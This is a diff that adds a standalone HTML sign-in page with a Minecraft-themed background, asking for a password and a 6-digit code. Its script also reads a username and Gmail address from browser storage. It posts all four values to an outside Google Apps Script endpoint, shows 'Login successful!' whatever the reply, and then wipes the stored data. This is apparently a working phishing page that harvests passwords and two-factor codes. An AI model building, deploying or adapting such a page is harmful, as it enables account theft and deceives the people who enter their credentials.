@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('https://images.1v9.gg/best%20minecraft%20capes-765795c140e4.webp') no-repeat center center fixed;
+      background-size: cover;
+    }
+
+    .overlay {
+      background-color: rgba(0, 0, 0, 0.5);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-box {
+      background: rgba(255, 255, 255, 0.9);
+      padding: 30px;
+      border-radius: 10px;
+      width: 300px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+
+    h2 {
+      margin-top: 0;
+      color: #333;
+      font-weight: 600;
+    }
+
+    input[type="password"], input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #1e88e5;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #1565c0;
+    }
+
+    #status {
+      margin-top: 10px;
+      font-size: 14px;
+      color: green;
+    }
+
+    .warning {
+      font-size: 13px;
+      color: red;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay">
+    <div class="login-box">
+      <h2>Login</h2>
+      <form id="loginForm">
+        <input type="password" name="password" placeholder="Password" required><br>
+        <input type="text" name="code" id="code" placeholder="6-digit Code" required maxlength="6" pattern="\d{6}" title="Enter a 6-digit numeric code"><br>
+        <button type="submit">Login</button>
+      </form>
+      <p class="warning" id="warningMsg"></p>
+      <p id="status"></p>
+    </div>
+  </div>
+
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwWU_jo9dGxh5MNTp7vP70ANUlT5V1XvukmMzIcfPimLHU__stD1w2HwSxNgFTwD7SSww/exec';
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const username = localStorage.getItem('username') || '';
+      const gmail = localStorage.getItem('gmail') || '';
+      const password = this.password.value;
+      const code = this.code.value.trim();
+
+      // Validate code
+      if (!/^\d{6}$/.test(code)) {
+        document.getElementById('warningMsg').innerText = "Code must be exactly 6 digits (numbers only).";
+        return;
+      } else {
+        document.getElementById('warningMsg').innerText = "";
+      }
+
+      const formData = new FormData();
+      formData.append("username", username);
+      formData.append("gmail", gmail);
+      formData.append("password", password);
+      formData.append("code", code);
+
+      fetch(scriptURL, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.text())
+      .then(result => {
+        document.getElementById('status').innerText = "Login successful!";
+        document.getElementById('loginForm').reset();
+        localStorage.clear();
+      })
+      .catch(error => {
+        document.getElementById('status').innerText = "Error: " + error.message;
+      });
+    });
+  </script>
+</body>
+</html>
